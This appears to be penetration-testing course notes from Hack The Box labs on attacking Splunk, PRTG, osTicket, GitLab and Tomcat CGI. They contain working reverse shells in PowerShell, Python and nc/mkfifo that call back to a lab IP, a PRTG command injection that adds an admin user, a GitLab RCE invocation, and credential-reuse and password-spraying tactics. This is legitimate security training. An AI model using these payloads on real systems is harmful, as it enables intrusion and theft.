	> As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. We'll cover this in the next section.

	> Aside from this built-in functionality, Splunk has suffered from various public vulnerabilities over the years, such as this SSRF(https://www.exploit-db.com/exploits/40895) that could be used to gain unauthorized access to the Splunk REST API. At the time of writing, Splunk has 47(https://www.cvedetails.com/vulnerability-list/vendor_id-10963/Splunk.html) CVEs. If we perform a vulnerability scan against Splunk during a penetration test, we will often see many non-exploitable vulnerabilities returned. This is why it is important to understand how to abuse built-in functionality.


-=-=
[+] Attacking Splunk
	> As discussed in the previous section, we can gain remote code execution on Splunk by creating a custom application to run Python, Batch, Bash, or PowerShell scripts. From the Nmap discovery scan, we noticed that our target is a Windows server. Since Splunk comes with Python installed, we can create a custom Splunk application that gives us remote code execution using Python or a PowerShell script.

* Abusing Built-In Functionality
	> We can use this(https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The bin directory in this repo has examples for Python(https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and PowerShell(https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Let's walk through this step-by-step.
	> To achieve this, we first need to create a custom Splunk application using the following directory structure.
		m1l0js@htb[/htb]$ tree splunk_shell/
		splunk_shell/
		├── bin
		└── default

	> The bin directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our inputs.conf file. Our reverse shell will be a PowerShell one-liner.

		#A simple and small reverse shell. Options and help removed to save space. 
		#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
		$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

	> The inputs.conf(https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.
		m1l0js@htb[/htb]$ cat inputs.conf 
			[script://./bin/rev.py]
			disabled = 0  
			interval = 10  
			sourcetype = shell 

			[script://.\bin\run.bat]
			disabled = 0
			sourcetype = shell
			interval = 10

	> We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
		@ECHO OFF
		PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
		Exit

	> Once the files are created, we can create a tarball or .spl file.
		m1l0js@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/
			splunk_shell/
			splunk_shell/bin/
			splunk_shell/bin/rev.py
			splunk_shell/bin/run.bat
			splunk_shell/bin/run.ps1
			splunk_shell/default/
			splunk_shell/default/inputs.conf

	> The next step is to choose Install app from file and upload the application.
	> Before uploading the malicious custom app, let's start a listener using Netcat or socat.
		m1l0js@htb[/htb]$ sudo nc -lnvp 443

	> On the Upload app page, click on browse, choose the tarball we created earlier and click Upload.
	> As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to Enabled.
	> In this case, we got a shell back as NT AUTHORTY\SYSTEM. If this were a real-world assessment, we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to use for lateral movement within the network. If this was our initial foothold in the domain environment, we could use this access to begin enumerating the Active Directory domain.

	> If we were dealing with a Linux host, we would need to edit the rev.py Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.
		Code: python

		import sys,socket,os,pty

		ip="10.10.14.15"
		port="443"
		s=socket.socket()
		s.connect((ip,int(port)))
		[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
		pty.spawn('/bin/bash')

* If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the $SPLUNK_HOME/etc/deployment-apps directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.


-=-=-=
[+] PRTG Network Monitor

	> PRTG Network Monitor is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more. The first version of PRTG was released in 2003. In 2015 a free version of PRTG was released, restricted to 100 sensors that can be used to monitor up to 20 hosts. It works with an autodiscovery mode to scan areas of a network and create a device list. Once this list is created, it can gather further information from the detected devices using protocols such as ICMP, SNMP, WMI, NetFlow, and more. Devices can also communicate with the tool via a REST API. The software runs entirely from an AJAX-based website, but there is a desktop application available for Windows, Linux, and macOS. A few interesting data points about PRTG:
    	- According to the company, it is used by 300,000 users worldwide
    	- The company that makes the tool, Paessler, has been creating monitoring solutions since 1997
    	- Some organizations that use PRTG to monitor their networks include the Naples International Airport, Virginia Tech, 7-Eleven, and more
	> Over the years, PRTG has suffered from 26 vulnerabilities(https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) that were assigned CVEs. Of all of these, only four have easy-to-find public exploit PoCs, two cross-site scripting (XSS), one Denial of Service, and one authenticated command injection vulnerability which we will cover in this section. It is rare to see PRTG exposed externally, but we have often come across PRTG during internal penetration tests. The HTB weekly release box Netmon(https://0xdf.gitlab.io/2019/06/29/htb-netmon.html) showcases PRTG.

* Discovery/Footprinting/Enumeration
	> We can quickly discover PRTG from an Nmap scan. It can typically be found on common web ports such as 80, 443, or 8080. It is possible to change the web interface port in the Setup section when logged in as an admin.
		m1l0js@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50
		PORT      STATE SERVICE       VERSION
		80/tcp    open  http          Microsoft IIS httpd 10.0
		135/tcp   open  msrpc         Microsoft Windows RPC
		139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
		445/tcp   open  microsoft-ds?
		3389/tcp  open  ms-wbt-server Microsoft Terminal Services
		5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
		5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
		8000/tcp  open  ssl/http      Splunkd httpd
		8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
		8089/tcp  open  ssl/http      Splunkd httpd
		47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

	> From the Nmap scan above, we can see the service Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor) detected on port 8080.
	> PRTG also shows up in the EyeWitness scan we performed earlier. Here we can see that EyeWitness lists the default credentials prtgadmin:prtgadmin. They are typically pre-filled on the login page, and we often find them unchanged. Vulnerability scanners such as Nessus also have plugins(https://www.tenable.com/plugins/nessus/51874) that detect the presence of PRTG.

	> Once we have discovered PRTG, we can confirm by browsing to the URL and are presented with the login page.
	> From the enumeration we performed so far, it seems to be PRTG version 17.3.33.2830 and is likely vulnerable to CVE-2018-9276(https://nvd.nist.gov/vuln/detail/CVE-2018-9276) which is an authenticated command injection in the PRTG System Administrator web console for PRTG Network Monitor before version 18.2.39. Based on the version reported by Nmap, we can assume that we are dealing with a vulnerable version. Using cURL we can see that the version number is indeed 17.3.33.283.

		m1l0js@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
  			<link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
			<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    		<span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>

	> Our first attempt to log in with the default credentials fails, but a few tries later, we are in with prtgadmin:Password123.

* Leveraging Known Vulnerabilities
	> Once logged in, we can explore a bit, but we know that this is likely vulnerable to a command injection flaw so let's get right to it. This excellent blog post(https://www.codewatch.org/blog/?p=453) by the individual who discovered this flaw does a great job of walking through the initial discovery process and how they discovered it. When creating a new notification, the Parameter field is passed directly into a PowerShell script without any type of input sanitization.
	> To begin, mouse over Setup in the top right and then the Account Settings menu and finally click on Notifications.
	> Next, click on Add new notification.
	> Give the notification a name and scroll down and tick the box next to EXECUTE PROGRAM. Under Program File, select Demo exe notification - outfile.ps1 from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add. During an actual assessment, we may want to do something that does not change the system, such as getting a reverse shell or connection to our favorite C2. Finally, click the Save button.

	> After clicking Save, we will be redirected to the Notifications page and see our new notification named pwn in the list.
	> Now, we could have scheduled the notification to run (and execute our command) at a later time when setting it up. This could prove handy as a persistence mechanism during a long-term engagement and is worth taking note of. Schedules can be modified in the account settings menu if we want to set it up to run at a specific time every day to get our connection back or something of that nature. At this point, all that is left is to click the Test button to run our notification and execute the command to add a local admin user. After clicking Test we will get a pop-up that says EXE notification is queued up. If we receive any sort of error message here, we can go back and double-check the notification settings.
	> Since this is a blind command execution, we won't get any feedback, so we'd have to either check our listener for a connection back or, in our case, check to see if we can authenticate to the host as a local admin. We can use CrackMapExec to confirm local admin access. We could also try to RDP to the box, access over WinRM, or use a tool such as evil-winrm or something from the impacket toolkit such as wmiexec.py or psexec.py.
		m1l0js@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 

-=-=-=
[+] osTicket 
	> osTicket is an open-source support ticketing system. It can be compared to systems such as Jira, OTRS, Request Tracker, and Spiceworks. osTicket can integrate user inquiries from email, phone, and web-based forms into a web interface. osTicket is written in PHP and uses a MySQL backend. It can be installed on Windows or Linux. Though there is not a considerable amount of market information readily available about osTicket, a quick Google search for Helpdesk software - powered by osTicket returns about 44,000 results, many of which look to be companies, school systems, universities, local government, etc., using the application. osTicket was even shown briefly in the show Mr. Robot.
	> Aside from learning about enumerating and attacking osTicket, the purpose of this section is also to introduce you to the world of support ticketing systems and why they should not be overlooked during our assessments.

* Footprinting/Discovery/Enumeration
	> Looking back at our EyeWitness scan from earlier, we notice a screenshot of an osTicket instance which also shows that a cookie named OSTSESSID was set when visiting the page. => (https://academy.hackthebox.com/storage/modules/113/osticket_eyewitness.png)

	>Also, most osTicket installs will showcase the osTicket logo with the phrase powered by in front of it in the page's footer. The footer may also contain the words Support Ticket System.
	>An Nmap scan will just show information about the webserver, such as Apache or IIS, and will not help us footprint the application.
	>osTicket is a web application that is highly maintained and serviced. If we look at the CVEs(https://www.cvedetails.com/vendor/2292/Osticket.html) found over decades, we will not find many vulnerabilities and exploits that osTicket could have. This is an excellent example to show how important it is to understand how a web application works. Even if the application is not vulnerable, it can still be used for our purposes. Here we can break down the main functions into the layers:
		1. User input 	
		2. Processing 	
		3. Solution

* User Input
	> The core function of osTicket is to inform the company's employees about a problem so that a problem can be solved with the service or other components. A significant advantage we have here is that the application is open-source. Therefore, we have many tutorials and examples available to take a closer look at the application. For instance, from the osTicket documentation(https://docs.osticket.com/en/latest/Getting%20Started/Post-Installation.html), we can see that only staff and users with administrator privileges can access the admin panel. So if our target company uses this or a similar application, we can cause a problem and "play dumb" and contact the company's staff. The simulated "lack of" knowledge about the services offered by the company in combination with a technical problem is a widespread social engineering approach to get more information from the company.

* Processing
	> As staff or administrators, they try to reproduce significant errors to find the core of the problem. Processing is finally done internally in an isolated environment that will have very similar settings to the systems in production. Suppose staff and administrators suspect that there is an internal bug that may be affecting the business. In that case, they will go into more detail to uncover possible code errors and address more significant issues.

* Solution
	> Depending on the depth of the problem, it is very likely that other staff members from the technical departments will be involved in the email correspondence. This will give us new email addresses to use against the osTicket admin panel (in the worst case) and potential usernames with which we can perform OSINT on or try to apply to other company services.

* Attacking osTicket
	> A search for osTicket on exploit-db shows various issues, including remote file inclusion, SQL injection, arbitrary file upload, XSS, etc. osTicket version 1.14.1 suffers from CVE-2020-24881(https://nvd.nist.gov/vuln/detail/CVE-2020-24881) which was an SSRF vulnerability. If exploited, this type of flaw may be leveraged to gain access to internal resources or perform internal port scanning.
	> Aside from web application-related vulnerabilities, support portals can sometimes be used to obtain an email address for a company domain, which can be used to sign up for other exposed applications requiring an email verification to be sent. As mentioned earlier in the module, this is illustrated in the HTB weekly release box Delivery(https://0xdf.gitlab.io/2021/05/22/htb-delivery.html) with a video walkthrough here.
	> Let's walk through a quick example, which is related to this excellent blog post9https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c which @ippsec also mentioned was an inspiration for his box Delivery which I highly recommend checking out after reading this section.
	> Suppose we find an exposed service such as a company's Slack server or GitLab, which requires a valid company email address to join. Many companies have a support email such as support@inlanefreight.local, and emails sent to this are available in online support portals that may range from Zendesk to an internal custom tool. Furthermore, a support portal may assign a temporary internal email address to a new ticket so users can quickly check its status.
	> If we come across a customer support portal during our assessment and can submit a new ticket, we may be able to obtain a valid company email address.
	> This is a modified version of osTicket as an example, but we can see that an email address was provided.
	> Now, if we log in, we can see information about the ticket and ways to post a reply. If the company set up their helpdesk software to correlate ticket numbers with emails, then any email sent to the email we received when registering, 940288@inlanefreight.local, would show up here. With this setup, if we can find an external portal such as a Wiki, chat service (Slack, Mattermost, Rocket.chat), or a Git repository such as GitLab or Bitbucket, we may be able to use this email to register an account and the help desk support portal to receive a sign-up confirmation email.

* osTicket - Sensitive Data Exposure

	> Let's say we are on an external penetration test. During our OSINT and information gathering, we discover several user credentials using the tool Dehashed(http://dehashed.com/) (for our purposes, the sample data below is fictional).

		m1l0js@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p
			id : 5996447501
			email : julie.clayton@inlanefreight.local
			username : jclayton
			password : JulieC8765!
			hashed_password : 
			name : Julie Clayton
			vin : 
			address : 
			phone : 
			database_name : ModBSolutions


			id : 7344467234
			email : kevin@inlanefreight.local
			username : kgrimes
			password : Fish1ng_s3ason!
			hashed_password : 
			name : Kevin Grimes
			vin : 
			address : 
			phone : 
			database_name : MyFitnessPal

			<SNIP>

	> This dump shows cleartext passwords for two different users: jclayton and kgrimes. At this point, we have also performed subdomain enumeration and come across several interesting ones.

		m1l0js@htb[/htb]$ cat ilfreight_subdomains
		vpn.inlanefreight.local
		support.inlanefreight.local
		ns1.inlanefreight.local
		mail.inlanefreight.local
		apps.inlanefreight.local
		ftp.inlanefreight.local
		dev.inlanefreight.local
		ir.inlanefreight.local
		auth.inlanefreight.local
		careers.inlanefreight.local
		portal-stage.inlanefreight.local
		dns1.inlanefreight.local
		dns2.inlanefreight.local
		meet.inlanefreight.local
		portal-test.inlanefreight.local
		home.inlanefreight.local
		legacy.inlanefreight.local

	> We browse to each subdomain and find that many are defunct, but the support.inlanefreight.local and vpn.inlanefreight.local are active and very promising. Support.inlanefreight.local is hosting an osTicket instance, and vpn.inlanefreight.local is a Barracuda SSL VPN web portal that does not appear to be using multi-factor authentication.
	> Let's try the credentials for jclayton. No luck. We then try the credentials for kgrimes and have no success but noticing that the login page also accepts an email address, we try kevin@inlanefreight.local and get a successful login!

	> The user kevin appears to be a support agent but does not have any open tickets. Perhaps they are no longer active? In a busy enterprise, we would expect to see some open tickets. Digging around a bit, we find one closed ticket, a conversation between a remote employee and the support agent.
	> The employee states that they were locked out of their VPN account and asks the agent to reset it. The agent then tells the user that the password was reset to the standard new joiner password. The user does not have this password and asks the agent to call them to provide them with the password (solid security awareness!). The agent then commits an error and sends the password to the user directly via the portal. From here, we could try this password against the exposed VPN portal as the user may not have changed it.
	> Furthermore, the support agent states that this is the standard password given to new joiners and sets the user's password to this value. We have been in many organizations where the helpdesk uses a standard password for new users and password resets. Often the domain password policy is lax and does not force the user to change at the next login. If this is the case, it may work for other users. Though out of the scope of this module, in this scenario, it would be worth using tools like linkedin2username(https://github.com/initstring/linkedin2username) to create a user list of company employees and attempt a password spraying attack against the VPN endpoint with this standard password.

	> Many applications such as osTicket also contain an address book. It would also be worth exporting all emails/usernames from the address book as part of our enumeration as they could also prove helpful in an attack such as password spraying.

* Closing Thoughts
	> Though this section showcased some fictional scenarios, they are based on things we are likely to see in the real world. When we come across support portals (especially external), we should test out the functionality and see if we can do things like creating a ticket and having a legitimate company email address assigned to us. From there, we may be able to use the email address to sign in to other company services and gain access to sensitive data.
	> This section also shows the dangers of password re-use and the kinds of data we may very likely find if we can gain access to a help desk agent's support ticketing queue. Organizations can prevent this type of information leakage by taking a few relatively easy steps:

    	- Limit what applications are exposed externally
    	- Enforce multi-factor authentication on all external portals
    	- Provide security awareness training to all employees and advise them not to use their corporate emails to sign up for third-party services
    	- Enforce a strong password policy in Active Directory and on all applications, disallowing common words such as variations of welcome, and password, the company name, and seasons and months
    	- Require a user to change their password after their initial login and periodically expire user's passwords

-=-=
[+] Gitlab - Discovery & Enumeration
	> GitLab is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality. It is open-source and originally written in Ruby, but the current technology stack includes Go, Ruby on Rails, and Vue.js. Gitlab was first launched in 2014 and, over the years, has grown into a 1,400 person company with $150 million revenue in 2020. Though the application is free and open-source, they also offer a paid enterprise version. Here are some quick stats about GitLab:
    	- At the time of writing, the company has 1,466 employees
    	- Gitlab has over 30 million registered users located in 66 countries
    	- The company publishes most of its internal procedures and OKRs publicly on their website
    	- Some companies that use GitLab include Drupal, Goldman Sachs, Hackerone, Ticketmaster, Nvidia, Siemens, and more

	> GitLab is similar to GitHub and BitBucket, which are also web-based Git repository tools. A comparison between the three can be seen here => (https://stackshare.io/stackups/bitbucket-vs-github-vs-gitlab)
	
	> During internal and external penetration tests, it is common to come across interesting data in a company's GitHub repo or a self-hosted GitLab or BitBucket instance. These Git repositories may just hold publicly available code such as scripts to interact with an API. However, we may also find scripts or configuration files that were accidentally committed containing cleartext secrets such as passwords that we may use to our advantage. We may also come across SSH private keys. We can attempt to use the search function to search for users, passwords, etc. Applications such as GitLab allow for public repositories (that require no authentication), internal repositories (available to authenticated users), and private repositories (restricted to specific users). It is also worth perusing any public repositories for sensitive data and, if the application allows, register an account and look to see if any interesting internal repositories are accessible. Most companies will only allow a user with a company email address to register and require an administrator to authorize the account, but as we'll see later on, a GitLab instance can be set up to allow anyone to register and then log in. => (https://academy.hackthebox.com/storage/modules/113/gitlab_signup_res.png)

	> If we can obtain user credentials from our OSINT, we may be able to log in to a GitLab instance. Two-factor authentication is disabled by default.
	
* Footprinting & Discovery

	> We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo.

	> The only way to footprint the GitLab version number in use is by browsing to the /help page when logged in. If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version. If we cannot register an account, we may have to try a low-risk exploit such as this(https://www.exploit-db.com/exploits/49821). We do not recommend launching various exploits at an application, so if we have no way to enumerate the version number (such as a date on the page, the first public commit, or by registering a user), then we should stick to hunting for secrets and not try multiple exploits against it blindly. There have been a few serious exploits against GitLab 12.9.0 and GitLab 11.4.7 in the past few years as well as GitLab Community Edition 13.10.3, 13.9.3, and 13.10.2.
		(https://www.exploit-db.com/exploits/48431)
		(https://www.exploit-db.com/exploits/49257)
		(https://www.exploit-db.com/exploits/49821)
		(https://www.exploit-db.com/exploits/49944)
		(https://www.exploit-db.com/exploits/49951)

* Enumeration
	> There's not much we can do against GitLab without knowing the version number or being logged in. The first thing we should try is browsing to /explore and see if there are any public projects that may contain something interesting. Browsing to this page, we see a project called Inlanefreight dev. Public projects can be interesting because we may be able to use them to find out more about the company's infrastructure, find production code that we can find a bug in after a code review, hard-coded credentials, a script or configuration file containing credentials, or other secrets such as an SSH private key or API key.
	> Browsing to the project, it looks like an example project and may not contain anything useful, though it is always worth digging around. => (http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev)

	> From here, we can explore each of the pages linked in the top right groups, snippets, and help. We can also use the search functionality and see if we can uncover any other projects. Once we are done digging through what is available externally, we should check and see if we can register an account and access additional projects. Suppose the organization did not set up GitLab only to allow company emails to register or require an admin to approve a new account. In that case, we may be able to access additional data.
	> We can also use the registration form to enumerate valid users (more on this in the next section). If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as Dehashed as seen in the osTicket section. Here we can see the user root is taken. We'll see another example of username enumeration in the next section. On this particular instance of GitLab (and likely others), we can also enumerate emails. If we try to register with an email that has already been taken, we will get the error 1 error prohibited this user from being saved: Email has already been taken. As of the time of writing, this username enumeration technique works with the latest version of GitLab. Even if the Sign-up enabled checkbox is cleared within the settings page under Sign-up restrictions, we can still browse to the /users/sign_up page and enumerate users but will not be able to register a user.

	> Some mitigations can be put in place for this, such as enforcing 2FA on all user accounts, using Fail2Ban to block failed login attempts which are indicative of brute-forcing attacks, and even restricting which IP addresses can access a GitLab instance if it must be accessible outside of the internal corporate network.

	> Let's go ahead and register with the credentials hacker:Welcome and log in and poke around. As soon as we complete registration, we are logged in and brought to the projects dashboard page. If we go to the /explore page now, we notice that there is now an internal project Inlanefreight website available to us. Digging around a bit, this just seems to be a static website for the company. Suppose this were some other type of application (such as PHP). In that case, we could possibly download the source and review it for vulnerabilities or hidden functionality or find credentials or other sensitive data.

	> In a real-world scenario, we may be able to find a considerable amount of sensitive data if we can register and gain access to any of their repositories. As this blog(https://tillsongalloway.com/finding-sensitive-information-on-github/index.html) post explains, there is a considerable amount of data that we may be able to uncover on GitLab, GitHub, etc.

* Onwards
	>This section shows us the importance (and power) of enumeration and that not every single application we uncover has to be directly exploitable to still prove very interesting and useful for us during an engagement. This is especially true on external penetration tests where the attack surface is usually considerably smaller than an internal assessment. We may need to gather data from two or more sources to mount a successful attack.

-=-=
[+] Attacking GitLab
	> As we saw in the previous section, even unauthenticated access to a GitLab instance could lead to sensitive data compromise. If we were able to gain access as a valid company user or an admin, we could potentially uncover enough data to fully compromise the organization in some way. GitLab has 553 CVEs(https://www.cvedetails.com/vulnerability-list/vendor_id-13074/Gitlab.html) reported as of September 2021. While not every single one is exploitable, there have been several severe ones over the years that could lead to remote code execution.

* Username Enumeration

	> Though not considered a vulnerability by GitLab as seen on their Hackerone page ("User and project enumeration/path disclosure unless an additional impact can be demonstrated"), it is still something worth checking as it could result in access if users are selecting weak passwords. We can do this manually, of course, but scripts make our work much faster. We can write one ourselves in Bash or Python or use this(https://www.exploit-db.com/exploits/49821) one to enumerate a list of valid users. The Python3 version of this same tool can be found here(https://github.com/dpgg101/GitLabUserEnum). As with any type of password spraying attack, we should be mindful of account lockout and other kinds of interruptions. GitLab's defaults are set to 10 failed attempts resulting in an automatic unlock after 10 minutes. This can be seen here(https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/initializers/8_devise.rb). This can be changed, but GitLab would have to be compiled by source. At this time, there is no way to change this setting from the admin UI, but an admin can modify the minimum password length, which could help with users choosing short, common passwords but will not entirely mitigate the risk of password attacks.

		# Number of authentication tries before locking an account if lock_strategy
		# is failed attempts.
		config.maximum_attempts = 10

		# Time interval to unlock the account if :time is enabled as unlock_strategy.
		config.unlock_in = 10.minutes

	> Downloading the script and running it against the target GitLab instance, we see that there are two valid usernames, root (the built-in admin account) and bob. If we successfully pulled down a large list of users, we could attempt a controlled password spraying attack with weak, common passwords such as Welcome1 or Password123, etc., or try to re-use credentials gathered from other sources such as password dumps from public data breaches.

		m1l0js@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

* Authenticated Remote Code Execution

	> Remote code execution vulnerabilities are typically considered the "cream of the crop" as access to the underlying server will likely grant us access to all data that resides on it (though we may need to escalate privileges first) and can serve as a foothold into the network for us to launch further attacks against other systems and potentially result in full network compromise. GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution vulnerability(https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version. We can use this exploit(https://www.exploit-db.com/exploits/49951) to achieve RCE.

	> As this is authenticated remote code execution, we first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.

		m1l0js@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

			[1] Authenticating
			Successfully Authenticated
			[2] Creating Payload 
			[3] Creating Snippet and Uploading
			[+] RCE Triggered !!

	> And we get a shell almost instantly.
		m1l0js@htb[/htb]$ nc -lnvp 8443


[+] Attacking Tomcat CGI

	> CVE-2019-0232 is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. Versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 of Tomcat are affected.
	> The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM. These external applications are typically CGI scripts written in languages like Perl, Python, or Bash. The CGI Servlet receives requests from web browsers and forwards them to CGI scripts for processing.
	> In essence, a CGI Servlet is a program that runs on a web server, such as Apache2, to support the execution of external applications that conform to the CGI specification. It is a middleware between web servers and external information resources like databases.
	> CGI scripts are utilised in websites for several reasons, but there are also some pretty big disadvantages to using them:
	> Advantages 	Disadvantages
		It is simple and effective for generating dynamic web content. 	Incurs overhead by having to load programs into memory for each request.
		Use any programming language that can read from standard input and write to standard output. 	Cannot easily cache data in memory between page requests.
		Can reuse existing code and avoid writing new code. 	It reduces the server's performance and consumes a lot of processing time.

	> The enableCmdLineArguments setting for Apache Tomcat's CGI Servlet controls whether command line arguments are created from the query string. If set to true, the CGI Servlet parses the query string and passes it to the CGI script as arguments. This feature can make CGI scripts more flexible and easier to write by allowing parameters to be passed to the script without using environment variables or standard input. For example, a CGI script can use command line arguments to switch between actions based on user input.
	> Suppose you have a CGI script that allows users to search for books in a bookstore's catalogue. The script has two possible actions: "search by title" and "search by author."
	> The CGI script can use command line arguments to switch between these actions. For instance, the script can be called with the following URL:
		Code: http
		http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby

	> Here, the action parameter is set to title, indicating that the script should search by book title. The query parameter specifies the search term "the great gatsby."
	> If the user wants to search by author, they can use a similar URL:
		Code: http
		http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald

	> Here, the action parameter is set to author, indicating that the script should search by author name. The query parameter specifies the search term "fitzgerald."
	> By using command line arguments, the CGI script can easily switch between different search actions based on user input. This makes the script more flexible and easier to use.
	> However, a problem arises when enableCmdLineArguments is enabled on Windows systems because the CGI Servlet fails to properly validate the input from the web browser before passing it to the CGI script. This can lead to an operating system command injection attack, which allows an attacker to execute arbitrary commands on the target system by injecting them into another command.
	> For instance, an attacker can append dir to a valid command using & as a separator to execute dir on a Windows system. If the attacker controls the input to a CGI script that uses this command, they can inject their own commands after & to execute any command on the server. An example of this is http://example.com/cgi-bin/hello.bat?&dir, which passes &dir as an argument to hello.bat and executes dir on the server. As a result, an attacker can exploit the input validation error of the CGI Servlet to run any command on the server.

* Enumeration
	> Scan the target using nmap, this will help to pinpoint active services currently operating on the system. This process will provide valuable insights into the target, discovering what services, and potentially which specific versions are running, allowing for a better understanding of its infrastructure and potential vulnerabilities.
		m1l0js@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open 
			8009/tcp  open  ajp13
			| ajp-methods: 
			|_  Supported methods: GET HEAD POST OPTIONS
			8080/tcp  open  http-proxy
			|_http-title: Apache Tomcat/9.0.17
			|_http-favicon: Apache Tomcat
	> Here we can see that Nmap has identified Apache Tomcat/9.0.17 running on port 8080 running.

* Finding a CGI script
	> One way to uncover web server content is by utilising the ffuf web enumeration tool along with the dirb common.txt wordlist. Knowing that the default directory for CGI scripts is /cgi, either through prior knowledge or by researching the vulnerability, we can use the URL http://10.129.204.227:8080/cgi/FUZZ.cmd or http://10.129.204.227:8080/cgi/FUZZ.bat to perform fuzzing.
	> Fuzzing Extentions - .CMD
		m1l0js@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd

	> Since the operating system is Windows, we aim to fuzz for batch scripts. Although fuzzing for scripts with a .cmd extension is unsuccessful, we successfully uncover the welcome.bat file by fuzzing for files with a .bat extension.
	> Fuzzing Extentions - .BAT
		m1l0js@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
			[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
			    * FUZZ: welcome
	
	> Navigating to the discovered URL at http://10.129.204.227:8080/cgi/welcome.bat returns a message:
		Code: txt
		Welcome to CGI, this section is not functional yet. Please return to home page.

* Exploitation
